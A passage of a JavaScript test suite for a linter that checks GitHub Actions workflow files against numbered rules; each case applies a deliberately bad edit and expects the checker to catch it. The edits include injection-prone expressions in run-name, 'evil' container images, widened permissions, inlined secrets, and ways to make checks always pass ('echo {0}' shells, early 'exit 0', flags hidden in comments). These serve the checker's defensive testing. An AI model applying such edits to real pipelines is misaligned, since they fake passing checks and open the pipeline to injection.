red('job-health\'s workflow sets defaults', edit(JOB_HEALTH, (d) => { d.defaults = { run: { shell: SHELL_EVIL } }; }), /job-health\.yml.*R17.*defaults/);
red('job-health\'s check step has a working-directory', edit(JOB_HEALTH, (d) => { jhStep(d)['working-directory'] = 'evil'; }), /job-health\.yml.*R17.*working-directory/);
red('job-health\'s job runs in a container', edit(JOB_HEALTH, (d) => { jhJob(d).container = 'evil/image:latest'; }), /job-health\.yml.*R17.*container/);
red('job-health runs on a self-hosted runner', edit(JOB_HEALTH, (d) => { jhJob(d)['runs-on'] = ['self-hosted', 'evil']; }), /job-health\.yml.*R17.*runs-on/);
red('job-health widens permissions to contents: write', edit(JOB_HEALTH, (d) => { d.permissions = { contents: 'write' }; }), /job-health\.yml.*R17.*permissions/);
red('job-health drops its permissions', edit(JOB_HEALTH, (d) => { delete d.permissions; }), /job-health\.yml.*R17.*permissions/);
red('job-health\'s job declares services with no env', edit(JOB_HEALTH, (d) => { jhJob(d).services = { x: { image: 'evil/image:latest' } }; }), /job-health\.yml.*R17.*services/);
red('job-health\'s job has a key the shape does not list', edit(JOB_HEALTH, (d) => { jhJob(d).outputs = { x: 'y' }; }), /job-health\.yml.*R17.*outputs/);
red('job-health\'s workflow has a key the shape does not list', edit(JOB_HEALTH, (d) => { d['run-name'] = '${{ github.event.head_commit.message }}'; }), /job-health\.yml.*R17.*run-name/);
red('job-health\'s job timeout is an expression', edit(JOB_HEALTH, (d) => { jhJob(d)['timeout-minutes'] = '${{ vars.X }}'; }), /job-health\.yml.*R17.*timeout-minutes/);
red('job-health\'s step has an id', edit(JOB_HEALTH, (d) => { jhStep(d).id = 'x'; }), /job-health\.yml.*R17.*id/);
// R8 reads only workflows that declare a Postgres service: job-health.yml declares none, and says nothing of R8.
red('job-health.yml given an unpinned postgres service is named by R8', edit(JOB_HEALTH, (d) => { jhJob(d).services = { db: { image: 'postgres:17' } }; }), /job-health\.yml.*R8/);

/* ---- the seed tool's database test is run where a Postgres service is (not a rule of the checker: a fact about the files) ---- */
{
  const job = Object.values(parse(REAL[REHEARSAL] ?? '').jobs ?? {}).find((j) => j.services?.postgres);
  const step = (job?.steps ?? []).find((s) => /\bnpm run test:release-db\b/.test(s.run ?? ''));
  if (step?.env?.DATABASE_URL) console.log('ok    rehearsal.yml runs test:release-db, with DATABASE_URL, in the job that has the Postgres service');
  else { failures += 1; console.error('FAIL  rehearsal.yml does not run `npm run test:release-db` with DATABASE_URL in a job with a Postgres service'); }
}

/* ---- R14: the seed goes red on anything but a 200 ---- */
const seedStep = (d) => d.jobs.seed.steps.find((x) => /curl/.test(x.run ?? ''));
red('the seed step is the old --fail-with-body form with no status comparison', edit(RELEASE, (d) => {
  seedStep(d).run = 'set -o pipefail\ncurl -sS --fail-with-body --retry 3 -X POST "https://${SUPABASE_PROJECT_REF}.supabase.co/functions/v1/seed" -H "apikey: ${KAYFABB_JOBS_KEY}" | tee -a "$GITHUB_STEP_SUMMARY"';
}), /R14.*--fail/);
red('the seed step no longer compares the status to 200', edit(RELEASE, (d) => {
  const st = seedStep(d);
  st.run = st.run.split('\n').filter((l) => !/= 200/.test(l)).join('\n');
}), /R14.*200/);
red('the seed step has no curl at all', edit(RELEASE, (d) => { seedStep(d).run = 'echo seeded'; }), /R14.*curl/);

/* ---- R13: schema's order, and the candidate's checkout ---- */
red('schema runs --after before the push', edit(RELEASE, (d) => {
  const steps = d.jobs.schema.steps;
  const iPush = steps.findIndex((x) => /db push/.test(x.run ?? ''));
  const iAfter = steps.findIndex((x) => /--after/.test(x.run ?? ''));
  if (iPush === iAfter) {
    // One step holds all three lines: reorder the lines inside it.
    const lines = steps[iPush].run.split('\n');
    const a = lines.findIndex((l) => /--after/.test(l));
    const p = lines.findIndex((l) => /db push/.test(l));
    [lines[a], lines[p]] = [lines[p], lines[a]];
    steps[iPush].run = lines.join('\n');
  } else [steps[iPush], steps[iAfter]] = [steps[iAfter], steps[iPush]];
}), /R13.*order/);
red('schema has no --before check', edit(RELEASE, (d) => {
  for (const s of d.jobs.schema.steps) if (s.run) s.run = s.run.split('\n').filter((l) => !/--before/.test(l)).join('\n');
  d.jobs.schema.steps = d.jobs.schema.steps.filter((s) => !s.run || s.run.trim());
}), /R13.*--before/);
red('schema has no --after check', edit(RELEASE, (d) => {
  for (const s of d.jobs.schema.steps) if (s.run) s.run = s.run.split('\n').filter((l) => !/--after/.test(l)).join('\n');
}), /R13.*--after/);
const seedDbIndex = (d) => d.jobs.schema.steps.findIndex((x) => /seed-database\.ts/.test(x.run ?? ''));
red('schema runs the seed before the push', edit(RELEASE, (d) => {
  const steps = d.jobs.schema.steps;
  const [seed] = steps.splice(seedDbIndex(d), 1);
  steps.splice(steps.findIndex((x) => /db push/.test(x.run ?? '')), 0, seed);
}), /R13.*seed-database\.ts after --after/);
red('schema runs the seed before the --after check', edit(RELEASE, (d) => {
  const steps = d.jobs.schema.steps;
  const [seed] = steps.splice(seedDbIndex(d), 1);
  const run = steps.find((x) => /db push/.test(x.run ?? ''));
  run.run = run.run.replace(/(node tools\/check-deployed-migrations\.mjs[^\n]*--after)/, `${seed.run}\n$1`);
}), /R13.*seed-database\.ts after --after/);
red('schema never seeds', edit(RELEASE, (d) => { d.jobs.schema.steps.splice(seedDbIndex(d), 1); }), /R13.*never runs tools\/release\/seed-database\.ts/);
red('seed-database.ts is handed the secret inside its run line', edit(RELEASE, (d) => {
  const st = d.jobs.schema.steps[seedDbIndex(d)];
  st.run = st.run.replace('"$SUPABASE_DB_URL"', '"${{ secrets.SUPABASE_DB_URL }}"');
}), /R11.*secrets/);
red('seed-database.ts runs under a traced shell', edit(RELEASE, (d) => { d.jobs.schema.steps[seedDbIndex(d)].shell = 'bash -x {0}'; }), /R12.*traces/);
red('seed does not check out the candidate', edit(RELEASE, (d) => {
  for (const s of d.jobs.seed.steps) if (String(s.uses ?? '').startsWith('actions/checkout')) delete s.with;
}), /R13.*seed.*check out/);
red('functions checks out main', edit(RELEASE, (d) => {
  for (const s of d.jobs.functions.steps) if (String(s.uses ?? '').startsWith('actions/checkout')) s.with = { ref: 'main' };
}), /R13.*functions.*check out/);

/* ---- R15: the release sets the Data API's pool, once, and nothing else does ---- */
const dataApiStep = (d) => {
  const st = Object.values(d.jobs).flatMap((j) => list(j.steps)).find((x) => /check-data-api\.mjs/.test(x.run ?? ''));
  if (!st) throw new Error('release.yml has no step that runs tools/check-data-api.mjs');
  return st;
};
red('the Data API step is removed', edit(RELEASE, (d) => {
  for (const j of Object.values(d.jobs)) j.steps = list(j.steps).filter((x) => !/check-data-api\.mjs/.test(x.run ?? ''));
}), /R15.*0 times/);
red('the Data API step runs without --set', edit(RELEASE, (d) => {
  const st = dataApiStep(d);
  st.run = st.run.replace(/\s--set\b/, '');
}), /R15.*without --set/);
red('a second workflow runs the Data API tool', edit(WEB, (d) => {
  Object.values(d.jobs)[0].steps.push({ run: 'node tools/check-data-api.mjs --project x --declared instances/divided-world/data-api.json' });
}), /web\.yml.*R15/);
red('the Data API step is in a job that does not name production', edit(RELEASE, (d) => {
  const job = Object.values(d.jobs).find((j) => list(j.steps).some((x) => /check-data-api\.mjs/.test(x.run ?? '')));
  if (!job) throw new Error('release.yml has no step that runs tools/check-data-api.mjs');
  delete job.environment;
}), /R15.*environment: production/);
red('the Data API step names a --declared file that does not exist', edit(RELEASE, (d) => {
  const st = dataApiStep(d);
  st.run = st.run.replace(/instances\/divided-world\/data-api\.json/, 'instances/divided-world/no-such-file.json');
}), /R15.*does not exist/);

red('the Data API step hides its --set behind a trailing comment', edit(RELEASE, (d) => {
  const st = dataApiStep(d);
  st.run = `${st.run.replace(/\s--set\b/, '')} # --set`;
}), /R15.*without --set/);
red('the Data API step hides its --declared behind a trailing comment', edit(RELEASE, (d) => {
  const st = dataApiStep(d);
  st.run = `${st.run.replace(/\s--declared\s+\S+/, '')} # --declared instances/divided-world/data-api.json`;
}), /R15.*no --declared/);
red('the Data API step is in a job with a strategy', edit(RELEASE, (d) => {
  const job = Object.values(d.jobs).find((j) => list(j.steps).some((x) => /check-data-api\.mjs/.test(x.run ?? '')));
  if (!job) throw new Error('release.yml has no step that runs tools/check-data-api.mjs');
  job.strategy = { matrix: { n: [1, 2] } };
}), /R15.*strategy/);
red('the Data API step spells --declared=<file>, which the tool refuses', edit(RELEASE, (d) => {
  const st = dataApiStep(d);
  st.run = st.run.replace(/--declared\s+/, '--declared=');
}), /R15.*--declared <file>/);

/* ---- R16: the SQL shards are one list, and sql-total gathers them ---- */
const SQL_RUN = 'npm run test:sql -- --shard=${{ matrix.shard }}/${{ strategy.job-total }} --report=sql-report-${{ matrix.shard }}.json';
const sqlJob = (d) => Object.values(d.jobs).find((j) => list(j.steps).some((s) => /npm run test:sql/.test(String(s.run ?? ''))));
const sqlStep = (d) => sqlJob(d).steps.find((s) => /npm run test:sql/.test(String(s.run ?? '')));
const sqlTotal = (d) => d.jobs['sql-total'];
const gatherStep = (d) => sqlTotal(d).steps.find((s) => /--gather/.test(String(s.run ?? '')));
const sqlShardsOf = (d) => Object.entries(d.jobs).find(([, j]) => j === sqlJob(d))[0];
const sqlRule = (fn) => edit(SQL, fn);
red('the SQL job has no matrix', sqlRule((d) => { delete sqlJob(d).strategy; }), /R16.*only key.*no matrix/);
red('the SQL shard list has a gap', sqlRule((d) => { sqlJob(d).strategy.matrix.shard = [1, 2, 4]; }), /R16.*shard list/);
red('the SQL shard list has a repeat', sqlRule((d) => { sqlJob(d).strategy.matrix.shard = [1, 2, 2, 3]; }), /R16.*shard list/);
red('the SQL matrix has a second key', sqlRule((d) => { sqlJob(d).strategy.matrix.os = ['a', 'b']; }), /R16.*only key/);
red('the SQL command has a literal total', sqlRule((d) => { sqlStep(d).run = SQL_RUN.replace('${{ strategy.job-total }}', '4'); }), /R16.*command/);
red('the SQL command writes no report', sqlRule((d) => { sqlStep(d).run = SQL_RUN.replace(/ --report=\S+/, ''); }), /R16.*command/);
red('the SQL shards do not stay running when one fails', sqlRule((d) => { delete sqlJob(d).strategy['fail-fast']; }), /R16.*fail-fast/);
red('a shard does not upload its report when it failed', sqlRule((d) => {
  const up = sqlJob(d).steps.find((s) => String(s.uses ?? '').startsWith('actions/upload-artifact'));
  delete up.if;
}), /R16.*upload/);
red('a shard uploads under a name other than sql-report-<shard>', sqlRule((d) => {
  const up = sqlJob(d).steps.find((s) => String(s.uses ?? '').startsWith('actions/upload-artifact'));
  up.with.name = 'report-${{ matrix.shard }}';
}), /R16.*upload/);
red('there is no sql-total job', sqlRule((d) => { delete d.jobs['sql-total']; }), /R16.*no sql-total/);
red('sql-total does not need the shards', sqlRule((d) => { sqlTotal(d).needs = []; }), /R16.*needs/);
red('sql-total is skipped when a shard fails', sqlRule((d) => { delete sqlTotal(d).if; }), /R16.*always\(\)/);
red('sql-total runs only on success', sqlRule((d) => { sqlTotal(d).if = 'success()'; }), /R16.*always\(\)/);
red('sql-total never reads the shards\' result', sqlRule((d) => {
  for (const s of sqlTotal(d).steps) { delete s.if; if (s.env) for (const k of Object.keys(s.env)) if (/needs\./.test(String(s.env[k]))) delete s.env[k]; }
  sqlTotal(d).steps = sqlTotal(d).steps.filter((s) => !/\$SHARDS|needs\./.test(JSON.stringify(s)));
}), /R16.*result/);
red('sql-total gathers nothing', sqlRule((d) => { gatherStep(d).run = 'echo done'; }), /R16.*gather/);
red('sql-total gathers from a directory it did not download to', sqlRule((d) => { gatherStep(d).run = 'node tools/test-sql.mjs --gather=elsewhere'; }), /R16.*gather/);
red('sql-total downloads no reports', sqlRule((d) => {
  sqlTotal(d).steps = sqlTotal(d).steps.filter((s) => !String(s.uses ?? '').startsWith('actions/download-artifact'));
}), /R16.*download/);
red('sql-total downloads only one shard\'s report', sqlRule((d) => {
  const dl = sqlTotal(d).steps.find((s) => String(s.uses ?? '').startsWith('actions/download-artifact'));
  dl.with.pattern = 'sql-report-1';
}), /R16.*download/);
red('sql-total is not skipped for a draft the way the shards are', sqlRule((d) => { sqlTotal(d).if = 'always()'; }), /R16.*draft/);
red('the drift check runs in every shard', sqlRule((d) => {
  for (const s of sqlJob(d).steps) if (/test-sql-drift/.test(s.run ?? '')) delete s.if;
}), /R16.*drift/);
red('the shard job is no longer named by sql-total\'s needs', sqlRule((d) => {
  const name = sqlShardsOf(d);
  d.jobs.renamed = d.jobs[name]; delete d.jobs[name];
}), /R16.*needs/);
const DRAFT_SKIP = "github.event_name != 'pull_request' || github.event.pull_request.draft == false";
const upload = (d) => sqlJob(d).steps.find((s) => String(s.uses ?? '').startsWith('actions/upload-artifact'));
const sqlName = (d) => sqlShardsOf(d);
red('the shards are skipped always', sqlRule((d) => { d.jobs[sqlName(d)].if = 'false'; }), /R16.*shards' job.*if/);
red('the shards run for a draft too', sqlRule((d) => { d.jobs[sqlName(d)].if = 'true'; }), /R16.*shards' job.*if/);
red('sql-total never runs (!always())', sqlRule((d) => { sqlTotal(d).if = `\${{ !always() && (${DRAFT_SKIP}) }}`; }), /R16.*sql-total.*if/);
red('sql-total runs for any draft (always() || draft)', sqlRule((d) => { sqlTotal(d).if = 'always() || github.event.pull_request.draft'; }), /R16.*sql-total.*if/);
red('sql-total\'s draft condition is dropped for a clause', sqlRule((d) => { sqlTotal(d).if = `always() && (${DRAFT_SKIP}) || true`; }), /R16.*sql-total.*if/);
red('the upload\'s if is not exactly always()', sqlRule((d) => { upload(d).if = 'always() && false'; }), /R16.*upload/);
red('the upload\'s if is a failure() only', sqlRule((d) => { upload(d).if = 'failure()'; }), /R16.*upload/);
red('the upload ignores a missing report', sqlRule((d) => { upload(d).with['if-no-files-found'] = 'ignore'; }), /R16.*upload/);
red('the upload names no if-no-files-found', sqlRule((d) => { delete upload(d).with['if-no-files-found']; }), /R16.*upload/);
red('a step continues on error', sqlRule((d) => { sqlTotal(d).steps.find((s) => /--gather/.test(s.run ?? ''))['continue-on-error'] = true; }), /R16.*continue-on-error/);
red('a job continues on error', sqlRule((d) => { sqlJob(d)['continue-on-error'] = true; }), /R16.*continue-on-error/);
red('the shards\' own step continues on error', sqlRule((d) => { sqlStep(d)['continue-on-error'] = true; }), /R16.*continue-on-error/);
red('the result step only echoes the result', sqlRule((d) => {
  const st = sqlTotal(d).steps.find((s) => /needs\./.test(JSON.stringify(s.env ?? {})));
  st.run = 'echo "$SHARDS"';
}), /R16.*result/);
red('the result step compares to the wrong value', sqlRule((d) => {
  const st = sqlTotal(d).steps.find((s) => /needs\./.test(JSON.stringify(s.env ?? {})));
  st.run = '[ "$SHARDS" != failure ]';
}), /R16.*result/);
red('the result step is skipped on failure', sqlRule((d) => {
  const st = sqlTotal(d).steps.find((s) => /needs\./.test(JSON.stringify(s.env ?? {})));
  st.if = 'false';
}), /R16.*result/);
red('the shards have no timeout', sqlRule((d) => { delete sqlJob(d)['timeout-minutes']; }), /R16.*timeout/);
red('the shards\' timeout crept up', sqlRule((d) => { sqlJob(d)['timeout-minutes'] = 75; }), /R16.*timeout/);
red('sql-total\'s timeout crept up', sqlRule((d) => { sqlTotal(d)['timeout-minutes'] = 45; }), /R16.*timeout/);
const dlStep = (d) => sqlTotal(d).steps.find((s) => String(s.uses ?? '').startsWith('actions/download-artifact'));
const resStep = (d) => sqlTotal(d).steps.find((s) => /needs\./.test(JSON.stringify(s.env ?? {})));
red('the download step is skipped by an if', sqlRule((d) => { dlStep(d).if = 'false'; }), /R16.*sql-total step/);
red('the gather step is skipped by an if', sqlRule((d) => { gatherStep(d).if = 'false'; }), /R16.*sql-total step/);
red('the gather step runs in a shell that always passes', sqlRule((d) => { gatherStep(d).shell = 'echo {0}'; }), /R16.*sql-total step/);
red('the result step runs in a shell that always passes', sqlRule((d) => { resStep(d).shell = 'echo {0}'; }), /R16.*sql-total step/);
red('a sql-total step changes its working directory', sqlRule((d) => { gatherStep(d)['working-directory'] = 'supabase'; }), /R16.*sql-total step/);
red('the checkout step is skipped by an if', sqlRule((d) => { sqlTotal(d).steps[0].if = 'false'; }), /R16.*sql-total step/);
red('the workflow sets defaults', sqlRule((d) => { d.defaults = { run: { shell: 'bash' } }; }), /R16.*defaults/);
red('a job sets defaults', sqlRule((d) => { sqlTotal(d).defaults = { run: { shell: 'echo {0}' } }; }), /R16.*defaults/);
red('the gather step exits 0 on an earlier line', sqlRule((d) => { gatherStep(d).run = `exit 0\n${gatherStep(d).run}`; }), /R16.*gather/);
red('the result step exits 0 on an earlier line', sqlRule((d) => { resStep(d).run = `exit 0\n${resStep(d).run}`; }), /R16.*result/);
red('sql-total\'s if loses its parentheses', sqlRule((d) => { sqlTotal(d).if = `always() && ${DRAFT_SKIP}`; }), /R16.*sql-total.*if/);
red('SHARDS is a constant, not the shards\' result', sqlRule((d) => { resStep(d).env.SHARDS = 'success'; }), /R16.*result/);
red('sql-total has no timeout', sqlRule((d) => { delete sqlTotal(d)['timeout-minutes']; }), /R16.*timeout.*sql-total/);
quiet('a conforming sql.yml passes', sqlRule(() => {}));

/* ---- a file that does not parse ---- */
red('a workflow that does not parse is named', { ...REAL, [BUILD]: 'on: [unclosed\n  - : :' }, /build\.yml/);

/* ---- the real files hold the shape ---- */
const real = problems(REAL);
if (real.length === 0) console.log('ok    the real files hold the shape');
else {
  failures += 1;
  console.error('FAIL  the real files hold the shape');
  for (const p of real) console.error(`        - ${p}`);
}

if (failures) {
  console.error(`\n${failures} case${failures === 1 ? '' : 's'} failed`);
  process.exit(1);
}
console.log('\nall cases pass');
